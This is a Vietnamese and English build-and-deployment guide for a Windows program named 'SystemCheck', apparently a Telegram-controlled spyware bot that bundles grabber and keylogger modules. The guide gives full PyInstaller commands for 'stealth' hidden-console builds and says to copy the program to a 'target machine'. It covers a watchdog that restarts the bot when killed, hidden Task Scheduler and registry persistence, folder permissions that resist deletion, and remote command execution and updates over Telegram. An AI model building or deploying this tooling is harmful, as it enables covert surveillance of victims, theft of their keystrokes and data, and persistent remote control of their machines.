# 📦 BUILD EXECUTABLE (EXE) - V12

> **Version:** 12.0 (Hardened, Full-Featured & Optimized)
> **Tool:** PyInstaller 6.19.0

---

## 🚀 Quick Build (Cả 2 EXE)

```bash
# 1. Main bot
pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name="SystemCheck" ^
  --hidden-import=pycaw.pycaw --hidden-import=comtypes --hidden-import=comtypes.client ^
  V12.py

# 2. Watchdog (restart bot tự động khi crash)
pyinstaller --onefile --noconsole --icon=icon.ico --name="watchdog" watchdog.py
```

**Output:**
- `dist/SystemCheck.exe` (~76 MB gồm Python 3.13 runtime)
- `dist/watchdog.exe` (~8-12 MB)

---

## 📋 Prerequisites

1. **Python 3.8+** (3.13 khuyến nghị)
2. **Dependencies:**
   ```bash
   pip install -r requirements.txt
   ```
3. **PyInstaller:**
   ```bash
   pip install pyinstaller
   ```
4. **icon.ico** — đã có sẵn trong project

---

## 🔧 Build Steps Chi Tiết

### Step 1: Kiểm Tra Setup
```bash
python verify_setup.py
```

### Step 2: Dọn Build Cũ (Khuyến Nghị)
```bash
rmdir /s /q build dist __pycache__
del SystemCheck.spec watchdog.spec 2>nul
```

### Step 3: Build SystemCheck.exe (Main Bot)
```bash
pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name="SystemCheck" ^
  --hidden-import=pycaw.pycaw ^
  --hidden-import=comtypes ^
  --hidden-import=comtypes.client ^
  V12.py
```

> PyInstaller tự động include tất cả modules được import: `config.py`, `utils.py`, `grabber.py`, `media.py`, `monitor.py`, `keylogger.py`. Không cần thêm flag cho các file này.

### Step 4: Build watchdog.exe (Auto-Restart)
```bash
pyinstaller --onefile --noconsole --icon=icon.ico --name="watchdog" watchdog.py
```

> watchdog.exe khi chạy sẽ tự tìm `SystemCheck.exe` trong cùng thư mục, launch nó, và tự restart nếu crash. Cũng tự đăng ký vào Task Scheduler để chạy cùng Windows.

### Step 5: Kiểm Tra Output
```bash
dir dist\SystemCheck.exe dist\watchdog.exe
```

---

## 📂 Deployment

### Files cần copy lên máy đích:
```
SystemCheck.exe   ← Main bot (từ dist/)
watchdog.exe      ← Auto-restart daemon (từ dist/)
.env              ← Cấu hình bắt buộc (cùng thư mục với EXE)
```

> **Không cần** copy các file .py, requirements.txt, hoặc bất kỳ file source nào khác.

### Cách chạy:
```
Right-click watchdog.exe → Run as administrator
```
watchdog.exe sẽ tự launch SystemCheck.exe và giám sát nó. Nếu SystemCheck.exe crash hoặc bị kill, watchdog tự restart trong 3 giây (tối đa 20 lần / 120 giây).

### Auto-startup:
- watchdog.exe tự đăng ký vào **Windows Task Scheduler** (AtLogon, Hidden, HighestAvailable) — không cần cấu hình thêm.

---

## 🔄 Remote Update (Sau Khi Deploy)

Sau khi SystemCheck.exe đang chạy, có thể update từ xa qua Telegram mà không cần physical access.

### Cài đặt một lần (DSM WebDAV):

**Trên Synology DSM:**
> Control Panel → File Services → WebDAV → Enable HTTPS (port 5006)

**Thêm vào `.env`:**
```ini
NAS_WEBDAV_URL=https://domain:port/path/to/SystemCheck.exe
NAS_WEBDAV_USER=username
NAS_WEBDAV_PASS=password
```

### Quy trình update:

```
Build mới SystemCheck.exe
       ↓
Upload lên NAS (DSM File Manager → thư mục cấu hình)
       ↓
Gõ /update trên Telegram
       ↓
Bot tải file, hiện progress %, kiểm tra MZ header
       ↓
Nhấn [✅ Apply & Restart]
       ↓
Bot backup EXE cũ → swap bat → os._exit(0) → watchdog restart
```

**Rollback nếu cần:** `/rollback` → nhấn confirm → swap về bản cũ

> **Cách hoạt động:** PyInstaller `--onefile` extract ra `%TEMP%` khi chạy, nên EXE gốc trên disk **không bị lock** → bat file có thể `move /y` sau khi process thoát.

---

## 🛠️ Manual Update (Có Physical Access / RDP)

Nếu không dùng được `/update` (bot offline, lỗi mạng, v.v.), thực hiện theo thứ tự sau:

**Bước 1 — Reset quyền folder (bảo vệ chống xóa đang bật)**
```
/cmd icacls "%APPDATA%\Microsoft\Windows\SystemMonitor" /reset /T
```
> ⚠️ Phải gửi lệnh này **trước** khi tắt bot. Nếu tắt bot trước, bạn sẽ không vào được folder để thay file.

**Bước 2 — Tắt bot và watchdog**
```
/stop
```
> Dùng `/stop` — **không dùng** `/cmd taskkill` (bị whitelist chặn).
> ✅ Sau khi bấm xác nhận, bot sẽ tắt hẳn là hành vi đúng (watchdog cũng bị dừng).

**Bước 3 — Copy EXE mới vào thư mục cài**
```
Copy SystemCheck.exe → cùng thư mục với watchdog.exe và .env
```

**Bước 4 — Chạy lại**
```
Right-click watchdog.exe → Run as administrator
```

Hoặc chạy nhanh bằng Task Scheduler (nếu task đã đăng ký):
```
schtasks /run /tn "SystemHealthMonitor"
```

---

## ⚙️ PyInstaller Options

| Option | Mục Đích |
|--------|---------|
| `--onefile` | Đóng gói thành 1 file EXE duy nhất |
| `--noconsole` | Ẩn console (stealth mode) |
| `--uac-admin` | Yêu cầu quyền Administrator khi chạy |
| `--icon=icon.ico` | Icon cho file EXE |
| `--name="SystemCheck"` | Tên file output |
| `--hidden-import=pycaw.pycaw` | Cần thiết cho volume control |

---

## ⏱️ Build Stats

| Mục | Giá Trị |
|-----|---------|
| Thời gian build SystemCheck.exe | 3-6 phút |
| Thời gian build watchdog.exe | 30-60 giây |
| Kích thước SystemCheck.exe | ~76 MB |
| Kích thước watchdog.exe | ~8-12 MB |
| Khởi động lần đầu | 20-30 giây (extract + cache) |
| Khởi động lần sau | 5-10 giây (cached) |

---

## ❓ Troubleshooting

**Build treo / không xong?**
```bash
rmdir /s /q build dist __pycache__
pip install --upgrade pyinstaller
```

**"Module not found" khi chạy EXE?**
```bash
# Kiểm tra import không lỗi
python -c "import V12"
# Reinstall deps
pip install -r requirements.txt
```

**EXE không chạy được?**
- Đảm bảo `.env` nằm cùng thư mục với `SystemCheck.exe`
- Chạy với quyền Administrator
- Xem lỗi trong `bot.log` (tự tạo cùng thư mục EXE)

**watchdog.exe không restart SystemCheck?**
- Chạy watchdog.exe với quyền Administrator
- Đảm bảo `SystemCheck.exe` và `watchdog.exe` cùng thư mục
- Xem `watchdog.log` để debug

**SmartScreen chặn EXE?**
- Chuột phải → Properties → Unblock
- Hoặc ký chứng chỉ (xem README.md phần Code Signing)


---

## 📋 Prerequisites

1. **Python 3.8+** installed (3.13 recommended)
2. **Dependencies installed:**
   ```bash
   pip install -r requirements.txt
   ```
3. **PyInstaller installed:**
   ```bash
   pip install pyinstaller
   ```
4. **icon.ico** file (already included in project)

---

## 🔧 Build Steps

### Step 1: Verify Setup
```bash
python verify_setup.py
```

### Step 2: Clean (Optional)
```bash
rmdir /s build dist
del SystemCheck.spec
```

### Step 3: Build
```bash
pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name="SystemCheck" \
  --hidden-import=pycaw.pycaw \
  --hidden-import=comtypes \
  --hidden-import=comtypes.client \
  V12.py
```

**PyInstaller automatically includes all imported modules** (config.py, utils.py, grabber.py, media.py, monitor.py, watchdog.py, keylogger.py).

> **V12 note:** `watchdog.py` và `keylogger.py` là module mới — được include tự động qua import.

### Step 4: Verify Output
```bash
dir dist\SystemCheck.exe
```

---

## 📂 Deployment

1. **Copy to target machine:**
   - `dist/SystemCheck.exe`
   - `.env` (same folder as EXE, with valid API_TOKEN and ADMIN_ID)

2. **Run as Administrator:**
   ```bash
   Right-click SystemCheck.exe → Run as administrator
   ```

3. **Auto-startup:**
   - Bot automatically registers in Windows Registry
   - Runs on every system boot

---

## ⚙️ PyInstaller Options

| Option | Purpose |
|--------|---------|
| `--onefile` | Single EXE file (not folder) |
| `--noconsole` | Hide console window (stealth) |
| `--uac-admin` | Request admin privilege at startup |
| `--icon=icon.ico` | Set EXE icon |
| `--name="SystemCheck"` | Output filename |

---

## ⏱️ Build Stats

- **Build time:** 2-5 minutes
- **EXE size:** 75-80 MB (includes Python 3.13 runtime)
- **First startup:** 20-30 seconds
- **Subsequent startup:** 5-10 seconds (cached)

---

## ❓ Troubleshooting

**Build hangs?**
- Clear: `rmdir /s build dist __pycache__`
- Reinstall PyInstaller: `pip install --upgrade pyinstaller`

**"Module not found"?**
- Verify: `python -c "import V12"`
- Reinstall deps: `pip install -r requirements.txt`

**EXE won't run?**
- Ensure `.env` is in same folder as EXE
- Run as Administrator
- Check `bot.log` for error details

**"Access denied" error?**
- Run Command Prompt as Administrator
- Retry build command

---

## 📝 Notes

- PyInstaller includes all imported dependencies automatically
- First run may take 30+ seconds (Python startup)
- Avoid running from slow USB/network drives
- If build fails, clean and retry: `rmdir /s build dist __pycache__ .pytest_cache`

---

**Developer:** TsByin | **Version:** 12.0
